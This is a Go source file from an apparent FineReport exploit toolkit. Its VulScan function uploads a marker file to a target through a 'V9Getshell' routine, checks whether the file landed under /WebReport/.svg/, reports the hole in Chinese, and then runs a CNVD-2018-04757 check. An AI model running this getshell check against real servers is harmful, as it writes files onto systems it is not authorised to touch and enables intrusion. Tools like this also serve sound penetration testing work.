package VulScan

import (
	"FineReportExploit/CNVD201804757"
	"FineReportExploit/V9Getshell"
	"FineReportExploit/utils"
	"fmt"
	"io/ioutil"
	"os"
	"time"
)

func VulScan(url string) {
	url = utils.FixUrl(url)

	//V9Getshell
	timeUnixNano := time.Now().String()
	md5str := utils.GetMd5(string(timeUnixNano))
	err := ioutil.WriteFile(md5str+".txt", []byte(md5str), 0644)
	if err != nil {
		panic(err)
	}
	name := md5str + ".txt"
	V9Getshell.V9Getshell(url, name, name)
	os.Remove(name)

	time.Sleep(5 * time.Second)
	body_str := utils.UrlGet(url + "/WebReport/.svg/" + name)
	if body_str == md5str {
		fmt.Println("====================")
		fmt.Println("存在漏洞：V9Getshell")
		fmt.Println("写入文件成功：" + url + "/WebReport/.svg/" + name)
		fmt.Println("====================")
	} else {
		fmt.Println("====================")
		fmt.Println("不存在漏洞：V9Getshell")
		fmt.Println("====================")
	}

	//CNVD201804757
	CNVD201804757.CNVD201804757(url)

}
